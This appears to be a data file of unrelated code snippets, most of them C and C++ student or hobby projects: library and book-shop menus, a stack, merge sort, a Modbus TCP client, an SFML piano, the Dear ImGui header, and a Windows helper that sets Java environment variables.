du livre que vous voulez supprimer :) : \\t\");\r\n\t scanf(\"%d\",&s);\r\n\t strcpy(l[s].titre, \"Ce livre est supprimee\");\r\n\t l[s].isbn=-1;\r\n\t l[s].edition=-1;\r\n\t l[s].exmp=-1;\r\n\t system(\"cls\");\r\n\t printf(\"Le livre a etait supprime avec succes :) \\n\");\r\n\t printf(\"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ \\n\");\r\n\t return;\r\n\t}\r\n\tvoid modification()\r\n\t{\r\n\t\tint i,s,j,o,r,t,k;\r\n\t\tmodifautlv:\r\n\t printf(\"voila la liste des livres existants :))\\n\");\r\n\t //struct tous l[n];\r\n     for(i=1 ; i<=n ; i++)\r\n\t {\r\n\t \tprintf(\"Livre n %d : %s\\n\",i,l[i].titre);\r\n\t \tprintf(\"\\n^^^^^^^^^^^^^^^^^\\n\");\r\n\t }\r\n\t printf(\"Taper l'indice du livre que vous voulez modifier :) : \\t\");\r\n\t scanf(\"%d\",&s);\r\n\t system(\"cls\");\r\n\t modifdumm:\r\n\t printf(\"Si vous voulez modifier le titre taper 1\\n\");\r\n\t printf(\"Si vous voulez modifier le code ISBN taper 2 \\n\");\r\n\t printf(\"Si vous voulez modifier l'edition taper 3 \\n\");\r\n\t printf(\"Si vous voulez modifier le nombre d'exemplaire taper 4 \\n\");\r\n\t scanf(\"%d\",&j);\r\n\t system(\"cls\");\r\n\t if(j==1)\r\n\t {\r\n\t \tprintf(\"Veuillez saisir le nouveau ti",
    "#include <iostream>\n\n// int main(){\n//     int x = 0;\n//     int x = 1; // this will give error as i can't use same variable name, which is why we use namespaces\n//     return 0;\n// }\n\nnamespace first{\n    int x = 123123;\n}\nnamespace second{\n    int x = 2;\n}\nint main(){\n    // using namespace first; // you can use this line so that you don't have to specify the namespaces but only for the one you named, you still have to specify for other  namespaces like second\n    // using namespace std; // this makes it so that you don't always have to say std:: for things like declaring a string or outputs\n    //although using the line above can give a lot of name conflicts because there are a lot of variables in it and naming your variables with things like \"data\" will be conflicted as it is in the std namespace, so you can use for example the line below:\n    using std::cout;\n    using std::string;\n\n    int x = 0;\n\n    cout << x << '\\n'; // if you don't specify the namespace it will use the local one\n    cout << first::x << '\\n'; // adding the namespace name and then ::variable name it will use the namespace\n\n    return 0;\n}\n\n",
    "#include <iostream>\nusing namespace std;\nclass Node\n{\npublic:\n\tint data;\n\tNode* next;\n\tNode()\n\t{\n\t\tdata = 0;\n\t\tnext = NULL;\n\t}\n};\nclass Stack\n{\n\tNode* Top;\npublic:\n\n\tStack()\n\t{\n\t\tTop = NULL;\n\t}\n\n\tbool isEmpty()\n\t{\n\t\tif (Top==NULL)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tvoid push(int item)\n\t{\n\t\tNode* newnode = new Node();\n\t\tnewnode->data = item;\n\n\t\tif (isEmpty())\n\t\t{\n\t\t\tnewnode->next = NULL;\n\t\t\tTop = newnode;\n\t\t}\n\n\t\telse\n\t\t{\n\t\t\tnewnode->next = Top;\n\t\t\tTop = newnode;\n\n\t\t}\n\t}\n\n\tvoid pop()\n\t{\n\t\tNode* delptr = Top;\n\t\tTop = Top->next;\n\t\tdelete delptr;\n\t}\n\n\tvoid display()\n\t{\n\t\tNode* temp = Top;\n\t\twhile (temp!=NULL)\n\t\t{\n\t\t\tcout << temp->data << \" \";\n\t\t\ttemp = temp->next;\n\t\t}\n\t\tcout << endl;\n\t}\n\n\tint top()\n\t{\n\t\treturn Top->data;\n\t}\n\n\tint count()\n\t{\n\t\tint counter = 0;\n\t\tNode* temp = Top;\n\t\twhile (temp != NULL)\n\t\t{\n\t\t\tcounter++;\n\t\t\ttemp = temp->next;\n\t\t}\n\t\treturn counter;\n\t}\n\n\tbool isFound(int item)\n\t{\n\t\tbool found = false;\n\t\tNode* temp = Top;\n\t\twhile (temp != NULL)\n\t\t{\n\t\t\tif (temp->data==item)\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t}\n\t\t\ttemp = temp->next;\n\t\t}\n\t\treturn found;\n\t}\n\n\tbool isFull()\n\t{\n\t\tNode* ptr = new Node();\n\t\tif (ptr==NULL)\n\t\t{\n\t\t\tcout << \"The stack is full \" << endl;\n\t\t}\n\t}\n\n\n};\nint main()\n{\n\tStack s;\n\tint item;\n\tfor (int i = 0; i < 3; i++)\n\t{\n\t\tcout << \"Enter an item to push \" << endl;\n\t\tcin >> item;\n\t\ts.push(item);\n\t}\n\tcout << \"Enter item to search for \" << endl;\n\tcin >> item;\n\tif (s.isFound(item))\n\t{\n\t\tcout << \"found\" << endl;\n\t}\n\telse\n\t{\n\t\tcout << \"not found\" << endl;\n\t}\n\tcout << s.count() << endl;\n\treturn 0;\n}",
    "#include <iostream>\nusing namespace std;\n\nvoid merge(int arr[], int left, int mid, int right) {\n    int n1 = mid - left + 1;\n    int n2 = right - mid;\n\n    int* L = new int[n1];\n    int* R = new int[n2];\n\n    for (int i = 0; i < n1; i++)\n        L[i] = arr[left + i];\n    for (int j = 0; j < n2; j++)\n        R[j] = arr[mid + 1 + j];\n\n    int i = 0, j = 0, k = left;\n    while (i < n1 && j < n2) {\n        if (L[i] <= R[j]) {\n            arr[k] = L[i];\n            i++;\n        } else {\n            arr[k] = R[j];\n            j++;\n        }\n        k++;\n    }\n\n    while (i < n1) {\n        arr[k] = L[i];\n        i++;\n        k++;\n    }\n\n    while (j < n2) {\n        arr[k] = R[j];\n        j++;\n        k++;\n    }\n\n    delete[] L;\n    delete[] R;\n}\n\nvoid mergeSort(int arr[], int left, int right) {\n    if (left < right) {\n        int mid = left + (right - left) / 2;\n        mergeSort(arr, left, mid);\n        mergeSort(arr, mid + 1, right);\n        merge(arr, left, mid, right);\n    }\n}\n\nint main() {\n    int arr[] = {12, 11, 13, 5, 6, 7};\n    int arr_size = sizeof(arr) / sizeof(arr[0]);\n\n    cout << \"Given array is \\n\";\n    for (int i = 0; i < arr_size; i++)\n        cout << arr[i] << \" \";\n\n    mergeSort(arr, 0, arr_size - 1);\n\n    cout << \"\\nSorted array is \\n\";\n    for (int i = 0; i < arr_size; i++)\n        cout << arr[i] << \" \";\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animation_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.87\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit win",
    "#include \"Core/TerraSerial.h\"\n#include \"Core/SoilHealthAnalyzer.h\"\n#include \"Core/Plant.h\"\n\n// TODO: GUI\n\nusing namespace TerraCheck;\n\nint main()\n{\n    try\n    {\n        TerraSerial::EnumeratePorts();\n        std::string portName;\n        std::cout << \"Enter serial port name: \";\n        std::getline(std::cin, portName);\n\n        // Connect to the serial port\n     \n        serial::Serial ser;\n        ser.setPort(portName);\n        ser.setBaudrate(9600);\n        ser.open();\n        if (ser.isOpen())\n        {\n            std::cout << \"Connected to \" << portName << \" at 9600 bps.\\n\";\n        }\n        else\n        {\n            std::cerr << \"Failed to open \" << portName << \".\\n\";\n            return 1;\n        }\n\n        // Load data for a specific plant (e.g., Rose)\n        std::string plantName;\n        std::cout << \"Enter plant name: \";\n        std::getline(std::cin, plantName);\n\n        // Extract data for the specified plant\n        Plant plant(plantName + \".json\");\n\n        // Get SoilHealthAnalyzer instance\n        SoilHealthAnalyzer& shaInstance = SoilHealthAnalyzer::Get();\n    \tstd::string tempStr;\n    \tser.readline(tempStr);\n        const float currentTemp = std::stof(tempStr);\n\n        // Analyze soil health\n        const Insights insights = shaInstance.Analyze(plant, currentTemp);\n        std::cout << \"Temp Optimality: \" << insights.tempOptimality << \"\\n\";\n        std::cout << \"Frost Risk: \" << insights.frostRisk << \"\\n\";\n        std::cout << \"Heat Stress Risk: \" << insights.heatStressRisk << \"\\n\";\n        std::cin.get();\n    }\n    catch (const std::exception& e)\n    {\n        std::cerr << \"Unhandled Exception: \" << e.what() << std::endl;\n        std::cin.get();\n        return 1;\n    }\n\n    return 0;\n}",
    "#include <iostream>\n#include <stdlib.h>\n#include <iomanip>\n#include <thread>\n#include <conio.h>\n#include \"Book.h\"\nusing namespace std;\n\nint main()\n{\n    bool quit = false;\n    Book book;\n\n    do\n    {\n        system(\"cls\");\n\n        char site;\n        cout << \"=========================================\" << endl;\n        cout << \"       BOOK SHOP MANAGEMENT SYSTEM       \" << endl;\n        cout << \"=========================================\" << endl;\n        cout << \"A. MERCHANT\" << endl;\n        cout << \"B. INVENTORY\" << endl;\n        cout << \"0. EXIT\" << endl;\n        cout << \"=========================================\" << endl;\n\n        cout << \"\\nPLEASE CHOOSE YOUR SITE: \";\n        cin >> site;\n\n        if (site == 'A' || site == 'a')\n        {\n            cout << \"\\nNavigating to Merchant...\" << endl;\n            std::this_thread::sleep_for(chrono::milliseconds(500));\n            system(\"cls\");\n            book.merchantMainPage();\n        }\n        else if (site == 'B' || site == 'b')\n        {\n            cout << \"\\nNavigating to Inventory...\" << endl;\n            std::this_thread::sleep_for(chrono::milliseconds(500));\n            system(\"cls\");\n            book.inventoryMainPage();\n        }\n        else if (site == '0')\n        {\n            string exitpass;\n            cout << \"\\n\\nARE YOU SURE?\\n\" << \"PLEASE TYPE \\\"YES\\\" TO EXIT:\\n\";\n            cin >> exitpass;\n\n            if (exitpass == \"YES\")\n            {\n                quit = true;\n                cout << \"\\nExiting...\" << endl;\n                std::this_thread::sleep_for(chrono::milliseconds(500));\n                system(\"cls\");\n                cout << \"THANK YOU SO MUCH!\" << endl;\n                std::this_thread::sleep_for(chrono::seconds(1));\n            }\n            else\n            {\n                cout << \"\\nExit key invalid, returning to main page...\" << endl;\n                std::this_thread::sleep_for(chrono::milliseconds(500));\n                system(\"cls\");\n            }\n        }\n        else\n        {\n            cout << \"\\nInvalid Input, please try again...\" << endl;\n            std::this_thread::sleep_for(chrono::milliseconds(500));\n            system(\"cls\");\n        }\n    } while (!quit);\n\n    return 0;\n}",
    "#include \"ModbusTCPMaster.hpp\"\n\nModbusTCPMaster::ModbusTCPMaster(const std::string &ip, int port)\n    : serverIp(ip), serverPort(port), transactionId(1), sock(-1) \n{\n    memset(&server, 0, sizeof(server));\n    server.sin_family = AF_INET;\n    server.sin_port = htons(serverPort);\n    server.sin_addr.s_addr = inet_addr(serverIp.c_str());\n}\n\nModbusTCPMaster::~ModbusTCPMaster() {\n    closeConnection();\n}\n\nbool ModbusTCPMaster::connectServer() {\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock == -1) {\n        std::cerr << \"Could not create socket\" << std::endl;\n        return false;\n    }\n\n    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {\n        std::cerr << \"Connect failed\" << std::endl;\n        close(sock);\n        sock = -1;\n        return false;\n    }\n\n    return true;\n}\n\nvoid ModbusTCPMaster::closeConnection() {\n    if (sock != -1) {\n        close(sock);\n        sock = -1;\n    }\n}\n\n/************************************************\n\nbyte 0~1 \u70ba\u672c\u6b21\u901a\u8a0a\u7684\u8b58\u5225\u78bc\nbyte 2~4 \u901a\u5e38\u70ba0\nbyte 5   \u70ba\u8cc7\u6599\u9577\u5ea6 (\u5f9eAddress ~ data\u7684\u7e3d\u9577\u5ea6)\n\n************************************************/\nvoid ModbusTCPMaster::setModbusTCPHeader(char *buffer, int transactionId){\n\n\tbuffer[0] = transactionId >> 8;\n    buffer[1] = transactionId & 0xFF;\n    \n    buffer[2] = 0x00;\n    buffer[3] = 0x00;\n    buffer[4] = 0x00;\n    \n    buffer[5] = 0x06;\n}\n\n/************************************************\n\n01: \u8b80\u53d6\u7576\u524d digital out status\n02: \u8b80\u53d6\u7576\u524d digital input status\n03: \u8b80\u53d6\u7576\u524d analog out status\n04: \u8b80\u53d6\u7576\u524d analog input status\n05: \u5beb\u5165\u55ae\u500b  digital out value\n06: \u5beb\u5165\u55ae\u500b  analog out value\n15: \u5beb\u5165\u591a\u500b  digital out value\n16: \u5beb\u5165\u591a\u500b  analog out value\n\n************************************************/\nvoid ModbusTCPMaster::setModbusTCPData(char *buffer, int functionCode, int length, const uint16_t *data){\n\tswitch(functionCode){\n\t\tcase 01:\n\t\tcase 02:\n\t\tcase 03:\n\t\tcase 04:\n\t\t\tbuffer[10] = length >> 8;\n    \t\tbuffer[11] = length & 0xFF;\n\t\t\tbreak;\n\t\t\t\n\t\tcase 05:\n\t\tcase 06:\n\t\t\tbuffer[10] = data[0];\n\t\t\tbuffer[11] = data[1];\n\t\t\tbreak;\n\t\t\t\n\t\tcase 15:\n\t\t\tbuffer[10] = length >> 8;\n    \t\tbuffer[11] = length & 0xFF;\n    \t\tbuffer[12] = data[0];\n    \t\t\n    \t\tif (data != nullptr){\n    \t\t\tfor ( int i = 0; i < data[0]; ++i){\n\t\t\t\t\tbuffer[12 + i * 2] = data[i+1];\n\t\t\t\t}\n    \t\t}\n    \t\tbreak;\n    \t\t\n    \tcase 16:\n\t\t\tbuffer[10] = length >> 8;\n    \t\tbuffer[11] = length & 0xFF;\n    \t\tbuffer[12] = data[0];\n    \t\t\n    \t\tif (data != nullptr){\n    \t\t\tfor (int i = 0; i < data[0]; ++i) {\n\t\t\t\t    buffer[12 + i * 2] = data[i+1] >> 8;\n\t\t\t\t    buffer[13 + i * 2] = data[i+1] & 0xFF;\n\t\t\t\t}\n    \t\t}\n    \t\tbreak;\n\t\t\n\t}\n}\n\n/************************************************\n\n-------------------------------------------------------------------------------------\n|TCP Header\t| Address | Function Code | Start register addr\t| query length | data   |\n-------------------------------------------------------------------------------------\n|6bytes\t    |1byte    |1byte          |2byte                |2bytes\t       |N bytes |\n-------------------------------------------------------------------------------------\n\n************************************************/\nvoid ModbusTCPMaster::buildModbusTCPPacket(char *buffer, int transactionId, int unitId, int functionCode, int startAddr, int length, const uint16_t *data) {\n    setModbusTCPHeader(buffer, transactionId);\n    buffer[6] = unitId;\n    buffer[7] = functionCode;\n    buffer[8] = startAddr >> 8;\n    buffer[9] = startAddr & 0xFF;\n    setModbusTCPData(buffer, functionCode, length, data);\n}\n\nint ModbusTCPMaster::sendModbusRequest(const char *request, int requestLength, char *response, int responseLength) {\n    if (send(sock, request, requestLength, 0) < 0) {\n        std::cerr << \"Send failed\" << std::endl;\n        return -1;\n    }\n\n    int responseReceived = recv(sock, response, responseLength, 0);\n    if (responseReceived < 0) {\n        std::cerr << \"Recv failed\" << std::endl;\n        return -1;\n    }\n\n    return responseReceived;\n}\n\nbool ModbusTCPMaster::readHoldingRegisters(int unitId, int startAddr, int functionCode, int length, std::vector<uint16_t> &registers) {\n    char modbusRequest[12];\n    buildModbusTCPPacket(modbusRequest, transactionId++, unitId, functionCode, startAddr, length, nullptr);\n\n    char response[256];\n    int responseLength = sendModbusRequest(modbusRequest, sizeof(modbusRequest), response, sizeof(response));\n    if (responseLength < 0) {\n        return false;\n    }\n\n    if (responseLength < 9 || response[7] != 3) {\n        std::cerr << \"Invalid response\" << std::endl;\n        return false;\n    }\n\n    int byteCount = response[8];\n    if (responseLength < 9 + byteCount) {\n        std::cerr << \"Incomplete response\" << std::endl;\n        return false;\n    }\n\n    registers.clear();\n    for (int i = 0; i < byteCount / 2; ++i) {\n        uint16_t reg = (response[9 + i * 2] << 8) | response[9 + i * 2 + 1];\n        registers.push_back(reg);\n    }\n\n    return true;\n}\n\nbool ModbusTCPMaster::writeHoldingRegisters(int unitId, int functionCode, int addr, const st",
    "#include <SFML/Graphics.hpp>\n#include<SFML/Audio.hpp>\n#include<iostream>\n\n#include<unistd.h>\n#include <libgen.h>\n\n\n#include\"keyboard_processing.h\"\n\nusing namespace sf;\nusing namespace std;\n\n\n\n                                 // SFML Piano Dimensions.\n\nint piano_x = 1680, piano_y = 400;\n\n\n                                 // SFML Key Dimensions\n\nVector2f white_key_dem(76,400);\nVector2f black_key_dem(50,250);\n\n                                // Key Colors.(I know the spelling of color angry bird!)\n\nColor key_white(245,255,255);\nColor pressed_white(175,225,190);  \n\nColor key_black(40,40,45);\nColor pressed_black(85,95,130);\n\n\n\n\n// Enum to Map the keys used in play_keys_from_cord()!\n// It is not that initiutional to know the keys from 0 and 1 while debugging! \n// Why am I being so sarcastic to myself.\n\nenum Note_enum {\n\n    // Defining Whites First.(I am racist!)\n\n    C4,D4,E4,F4,G4,A4,B4,\n    C5,D5,E5,F5,G5,A5,B5,\n    C6,D6,E6,F6,G6,A6,B6,\n\n    // Black are minors!(Its the music theory that is racist!)\n\n    DB4,EB4,GB4,AB4,BB4,\n    DB5,EB5,GB5,AB5,BB5,\n    DB6,EB6,GB6,AB6,BB6,\n\n};\n\n\n\n/**\n    @brief This Code is created to get the Path of the Notes from the assets folder.\n            so, People like Ayush don't kill themselfs after coping this code!\n\n\n    @param : String - It takes in string of the note!\n    @return : It return path of the given note!.\n*/\n\nstring path_from_note(string note_name){\n\n    char cwd[255];\n\n    getcwd(cwd,sizeof(cwd));\n\n    string parent_dir = dirname(cwd);\n\n    return parent_dir + \"/assets/Notes/\" + note_name + \".wav\";\n\n}\n\n\n/**\n    @brief This is the algorithm that checks which key should be played!!!\n    This is the worst way to do it(It have O(n)) But i had to give this code in 1 week so.....Who caresssss.\n    I will make it cool with the OOPS and Binary search!\n\n    @param : float x - The x-coordinate of the finger!\n    @param : float y - The y-coordinate of the finger!\n\n    @return : There is a void in from front of what can I return from the function huh!?\n*/\n\nvoid play_keys_from_cord(float x,float y,Key_class& key_obj){\n\n\n    \n    if(y < 125){                       // Checking for the black keys.\n        \n        // DB4\n        if(27.5 < x && x < 52.5){\n\n            key_obj.key_list[DB4].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[DB4].set_default();\n        }\n\n        // EB4\n        if(67.5 < x && x < 92.5){\n\n            key_obj.key_list[EB4].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[EB4].set_default();\n        }\n\n        // GB4\n        if(147.5 < x && x < 172.5){\n\n            key_obj.key_list[EB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[EB5].set_default();\n        }\n\n        //AB4\n        if(187.5 < x && x < 212.5){\n\n            key_obj.key_list[AB4].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[AB4].set_default();\n        }\n\n        //BB4\n        if(227.5 < x && x < 252.5){\n\n            key_obj.key_list[BB4].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[BB4].set_default();\n        }\n        \n        //DB5\n        if(307.5 < x && x < 332.5){\n\n            key_obj.key_list[DB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[DB5].set_default();\n        }\n        \n        //EB5\n        if(347.5 < x && x < 372.5){\n\n            key_obj.key_list[EB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[EB5].set_default();\n        }\n\n        //GB5\n        if(427.5 < x && x < 452.5){\n\n            key_obj.key_list[GB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[GB5].set_default();\n        }\n\n        //AB5\n        if(467.5 < x && x < 492.5){\n\n            key_obj.key_list[AB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[AB5].set_default();\n        }\n\n        //BB5\n        if(507.5 < x && x < 532.5){\n\n            key_obj.key_list[BB5].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[BB5].set_default();\n        }\n\n        //DB6\n        if(587.5 < x && x < 612.5){\n\n            key_obj.key_list[DB6].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[DB6].set_default();\n        }\n\n        //EB6\n        if(627.5 < x && x < 652.5){\n\n            key_obj.key_list[EB6].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[EB6].set_default();\n        }\n\n        //GB6\n        if(707.5 < x && x < 732.5){\n\n            key_obj.key_list[GB6].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[GB6].set_default();\n        }\n\n        //AB6\n        if(747.5 < x && x < 772.5){\n\n            key_obj.key_list[AB6].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[AB6].set_default();\n        }\n\n        //BB6 Atlast......Damn I will feel bad if some Mofo copied this code.\n        if(787.5 < x && x < 812.5){\n\n            key_obj.key_list[BB6].set_play();\n\n        }\n        else{\n\n            key_obj.key_list[BB6].set_default();\n        }\n\n    }",
    "#include<Windows.h>\r\n#include<stdio.h>\r\n#include<commdlg.h>\r\n#include<string.h>\r\n#include<string>\r\n#include<iostream>\r\nusing namespace std;\r\nvoid Setting_envVar(){\r\n\tOPENFILENAME ofn;\r\n\tchar FileName[MAX_PATH];\r\n\tmemset(&ofn,0,sizeof(OPENFILENAME));\r\n\tmemset(FileName,0,sizeof(char)*MAX_PATH); \r\n\tofn.lStructSize=sizeof(OPENFILENAME); \r\n\tofn.lpstrFilter=TEXT(\"All Files(*.*)\\0*.*\\0\\0\");\r\n\tofn.lpstrFile=FileName;\r\n\tofn.nMaxFile=MAX_PATH;\r\n\tofn.Flags=OFN_FILEMUSTEXIST;\r\n\tprintf(\"Please select the java jdk path.\\n\");\r\n\tif(GetOpenFileName(&ofn)){\r\n\t\t  string str=FileName;\r\n\t\t  int index=str.find_last_of(\"\\\\\"); \r\n\t\t  string cmd1=\"setx \\\"JAVA_HOME\\\" \\\"\"+str.substr(0,index-1)+\"\\\" /m\";\r\n\t\t  string cmd2=\"setx \\\"PATH %PATH%;%JAVA_HOME%\\\\bin;%JAVA_HOME%\\\\jre\\\\bin\\\" /m\";\r\n\t\t  const char* p = cmd1.data();\r\n\t\t  system(p);\r\n\t\t  cmd2=\"setx \\\"PATH %PATH%;%JAVA_HOME%\\\\bin\\\" /m\";\r\n\t\t  p = cmd2.data();\r\n\t\t  system(p);cout<<p<<endl;\r\n\t\t  cmd2=\"setx \\\"PATH %PATH%;%JAVA_HOME%\\\\jre\\\\bin\\\" /m\";\r\n\t\t  p = cmd2.data();\r\n\t\t  system(p);\r\n\t\t  string cmd3=\"setx \\\"ClassPath %ClassPath%;%JAVA_HOME%\\\\lib\\\\dt.jar\\\" /m\";\r\n\t\t  p = cmd3.data();\r\n\t\t  system(p);\r\n\t\t  cmd3=\"setx \\\"ClassPath %ClassPath%;%JAVA_HOME%\\\\lib\\\\tools.jar\\\" /m\";\r\n\t\t  p = cmd3.data();\r\n\t\t  system(p);  \r\n\t}\r\n}\r\nstring run_java(int id){\r\n\tOPENFILENAME ofn;\r\n\tchar FileName[MAX_PATH];\r\n\tmemset(&ofn,0,sizeof(OPENFILENAME));\r\n\tmemset(FileName,0,sizeof(char)*MAX_PATH);\r\n\tofn.lStructSize=sizeof(OPENFILENAME);\r\n\tofn.lpstrFilter=TEXT(\"Text Files(*java)\\0*.java\\0All Files(*.*)\\0*.*\\0\\0\");\r\n\tofn.lpstrFile=FileName;\r\n\tofn.nMaxFile=MAX_PATH;\r\n\tofn.Flags=OFN_FILEMUSTEXIST;\r\n\tstring strx;\r\n\tif(GetOpenFileName(&ofn)){\r\n\t    string str=FileName;  \r\n\t\tstring str0=\"javac \"+str;\r\n\t\tconst char* com=str0.data();\r\n\t\tsystem(com);\r\n\t\tint index=str.find_last_of(\"\\\\\"); \r\n\t\tstring str1=\"cd \"+str.substr(0,index);\r\n\t\tcom=str1.data();\r\n\t\tsystem(com);\r\n\t\tint index2=str.find_last_of(\".\"); \r\n\t\tstrx=\"java \"+str.substr(index+1,index2-index-1)+\" < ..\\\\data.in > ..\\\\answer\"+to_string(id)+\".out\";\r\n\t    string strxx=str.substr(index+1,str.length()-index-1);\r\n\t    cout<<\"The currently selected program is \"<<strxx<<endl;\r\n\t}\r\n\treturn strx;\r\n}\r\nstring run_rand_data(){\r\n\tOPENFILENAME ofn;\r\n\tchar FileName[MAX_PATH];\r\n\tmemset(&ofn,0,sizeof(OPENFILENAME));\r\n\tmemset(FileName,0,sizeof(char)*MAX_PATH);\r\n\tofn.lStructSize=sizeof(OPENFILENAME);\r\n\tofn.lpstrFilter=TEXT(\"Text Files(*java)\\0*.java\\0All 